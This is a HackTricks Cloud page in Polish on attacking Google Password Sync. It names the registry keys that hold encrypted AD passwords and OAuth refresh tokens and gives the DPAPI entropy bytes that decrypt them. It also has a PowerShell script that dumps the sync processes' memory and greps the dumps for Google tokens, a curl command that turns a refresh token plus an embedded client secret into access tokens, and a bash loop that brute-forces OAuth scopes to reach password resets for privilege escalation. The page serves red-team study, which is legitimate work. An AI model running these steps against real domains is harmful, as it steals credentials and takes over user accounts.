# GPS - Google Password Sync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Podstawowe informacje

To jest binarny plik i usÅ‚uga, ktÃ³re Google oferuje w celu **utrzymania synchronizacji haseÅ‚ uÅ¼ytkownikÃ³w miÄ™dzy AD** a Workspace. Za kaÅ¼dym razem, gdy uÅ¼ytkownik zmienia swoje hasÅ‚o w AD, jest ono ustawiane w Google.

Instaluje siÄ™ w `C:\Program Files\Google\Password Sync`, gdzie moÅ¼na znaleÅºÄ‡ binarny plik `PasswordSync.exe` do jego konfiguracji oraz `password_sync_service.exe` (usÅ‚uga, ktÃ³ra bÄ™dzie nadal dziaÅ‚aÄ‡).

### GPS - Konfiguracja

Aby skonfigurowaÄ‡ ten plik binarny (i usÅ‚ugÄ™), naleÅ¼y **przyznaÄ‡ mu dostÄ™p do Super Admina w Workspace**:

* Zaloguj siÄ™ za pomocÄ… **OAuth** z Google, a nastÄ™pnie **zapisze token w rejestrze (szyfrowany)**
* DostÄ™pne tylko w kontrolerach domeny z GUI
* Przyznanie **poÅ›wiadczeÅ„ konta usÅ‚ugi z GCP** (plik json) z uprawnieniami do **zarzÄ…dzania uÅ¼ytkownikami Workspace**
* Bardzo zÅ‚y pomysÅ‚, poniewaÅ¼ te poÅ›wiadczenia nigdy nie wygasajÄ… i mogÄ… byÄ‡ naduÅ¼ywane
* Bardzo zÅ‚y pomysÅ‚, aby daÄ‡ SA dostÄ™p do workspace, poniewaÅ¼ SA moÅ¼e zostaÄ‡ skompromitowane w GCP i moÅ¼liwe bÄ™dzie przejÅ›cie do Workspace
* Google wymaga tego dla kontrolowanych domen bez GUI
* Te poÅ›wiadczenia sÄ… rÃ³wnieÅ¼ przechowywane w rejestrze

JeÅ›li chodzi o AD, moÅ¼liwe jest wskazanie, aby uÅ¼ywaÅ‚o aktualnego **kontekstu aplikacji, anonimowego lub jakichÅ› konkretnych poÅ›wiadczeÅ„**. JeÅ›li wybrano opcjÄ™ poÅ›wiadczeÅ„, **nazwa uÅ¼ytkownika** jest przechowywana w pliku na **dysku**, a **hasÅ‚o** jest **szyfrowane** i przechowywane w **rejestrze**.

### GPS - Zrzut hasÅ‚a i tokenu z dysku

{% hint style="success" %}
ZauwaÅ¼, Å¼e [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) jest w stanie wykryÄ‡ **GPS**, uzyskaÄ‡ informacje o konfiguracji i **nawet odszyfrowaÄ‡ hasÅ‚o i token**.
{% endhint %}

W pliku **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** moÅ¼na znaleÅºÄ‡ czÄ™Å›Ä‡ konfiguracji, takÄ… jak **`baseDN`** skonfigurowanego AD oraz **`username`**, ktÃ³rych poÅ›wiadczenia sÄ… uÅ¼ywane.

W rejestrze **`HKLM\Software\Google\Google Apps Password Sync`** moÅ¼na znaleÅºÄ‡ **szyfrowany token odÅ›wieÅ¼ania** oraz **szyfrowane hasÅ‚o** dla uÅ¼ytkownika AD (jeÅ›li istnieje). Ponadto, jeÅ›li zamiast tokenu uÅ¼ywane sÄ… jakieÅ› **poÅ›wiadczenia SA**, rÃ³wnieÅ¼ moÅ¼na je znaleÅºÄ‡ w tym adresie rejestru. **WartoÅ›ci** w tym rejestrze sÄ… dostÄ™pne tylko dla **AdministratorÃ³w**.

Szyfrowane **hasÅ‚o** (jeÅ›li istnieje) znajduje siÄ™ w kluczu **`ADPassword`** i jest szyfrowane za pomocÄ… API **`CryptProtectData`**. Aby je odszyfrowaÄ‡, musisz byÄ‡ tym samym uÅ¼ytkownikiem, ktÃ³ry skonfigurowaÅ‚ synchronizacjÄ™ haseÅ‚ i uÅ¼yÄ‡ tej **entropii** podczas korzystania z **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

Szyfrowany token (jeÅ›li istnieje) znajduje siÄ™ w kluczu **`AuthToken`** i jest szyfrowany za pomocÄ… API **`CryptProtectData`**. Aby go odszyfrowaÄ‡, musisz byÄ‡ tym samym uÅ¼ytkownikiem, ktÃ³ry skonfigurowaÅ‚ synchronizacjÄ™ haseÅ‚ i uÅ¼yÄ‡ tej **entropii** podczas korzystania z **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
Ponadto jest rÃ³wnieÅ¼ kodowany za pomocÄ… base32hex z uÅ¼yciem sÅ‚ownika **`0123456789abcdefghijklmnopqrstv`**.

WartoÅ›ci entropii zostaÅ‚y znalezione przy uÅ¼yciu narzÄ™dzia. ZostaÅ‚o skonfigurowane do monitorowania wywoÅ‚aÅ„ do **`CryptUnprotectData`** i **`CryptProtectData`**, a nastÄ™pnie narzÄ™dzie zostaÅ‚o uÅ¼yte do uruchomienia i monitorowania `PasswordSync.exe`, ktÃ³re odszyfruje skonfigurowane hasÅ‚o i token autoryzacji na poczÄ…tku, a narzÄ™dzie **pokaÅ¼e wartoÅ›ci entropii uÅ¼ytej** w obu przypadkach:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

ZauwaÅ¼, Å¼e moÅ¼liwe jest rÃ³wnieÅ¼ zobaczenie **odszyfrowanych** wartoÅ›ci w wejÅ›ciu lub wyjÅ›ciu wywoÅ‚aÅ„ do tych API (w przypadku, gdy w pewnym momencie Winpeas przestanie dziaÅ‚aÄ‡).

W przypadku, gdy synchronizacja haseÅ‚ zostaÅ‚a **skonfigurowana z poÅ›wiadczeniami SA**, rÃ³wnieÅ¼ bÄ™dzie przechowywana w kluczach w rejestrze **`HKLM\Software\Google\Google Apps Password Sync`**.

### GPS - Zrzut tokenÃ³w z pamiÄ™ci

Podobnie jak w przypadku GCPW, moÅ¼liwe jest zrzucenie pamiÄ™ci procesu `PasswordSync.exe` oraz procesÃ³w `password_sync_service.exe`, a bÄ™dziesz w stanie znaleÅºÄ‡ tokeny odÅ›wieÅ¼ania i dostÄ™pu (jeÅ›li zostaÅ‚y juÅ¼ wygenerowane).\
MyÅ›lÄ™, Å¼e moÅ¼na rÃ³wnieÅ¼ znaleÅºÄ‡ skonfigurowane poÅ›wiadczenia AD.

<details>

<summary>Zrzut <code>PasswordSync.exe</code> i procesÃ³w <code>password_sync_service.exe</code> oraz wyszukiwanie tokenÃ³w</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Generowanie tokenÃ³w dostÄ™pu z tokenÃ³w odÅ›wieÅ¼ajÄ…cych

UÅ¼ywajÄ…c tokena odÅ›wieÅ¼ajÄ…cego, moÅ¼liwe jest generowanie tokenÃ³w dostÄ™pu przy uÅ¼yciu go oraz identyfikatora klienta i tajnego klucza klienta okreÅ›lonych w nastÄ™pujÄ…cym poleceniu:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Zakresy

{% hint style="info" %}
ZauwaÅ¼, Å¼e nawet posiadajÄ…c token odÅ›wieÅ¼ajÄ…cy, nie jest moÅ¼liwe Å¼Ä…danie Å¼adnego zakresu dla tokena dostÄ™pu, poniewaÅ¼ moÅ¼esz Å¼Ä…daÄ‡ tylko **zakresÃ³w obsÅ‚ugiwanych przez aplikacjÄ™, w ktÃ³rej generujesz token dostÄ™pu**.

Ponadto, token odÅ›wieÅ¼ajÄ…cy nie jest waÅ¼ny w kaÅ¼dej aplikacji.
{% endhint %}

DomyÅ›lnie GPS nie bÄ™dzie miaÅ‚ dostÄ™pu jako uÅ¼ytkownik do kaÅ¼dego moÅ¼liwego zakresu OAuth, wiÄ™c uÅ¼ywajÄ…c poniÅ¼szego skryptu moÅ¼emy znaleÅºÄ‡ zakresy, ktÃ³re moÅ¼na wykorzystaÄ‡ z `refresh_token`, aby wygenerowaÄ‡ `access_token`:

<details>

<summary>Skrypt Bash do brute-force zakresÃ³w</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

A oto wynik, ktÃ³ry otrzymaÅ‚em w momencie pisania:
```
https://www.googleapis.com/auth/admin.directory.user
```
KtÃ³ry jest taki sam, jak ten, ktÃ³ry otrzymujesz, jeÅ›li nie wskaÅ¼esz Å¼adnego zakresu.

{% hint style="danger" %}
Z tym zakresem moÅ¼esz **zmodyfikowaÄ‡ hasÅ‚o istniejÄ…cego uÅ¼ytkownika, aby zwiÄ™kszyÄ‡ uprawnienia**.
{% endhint %}

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
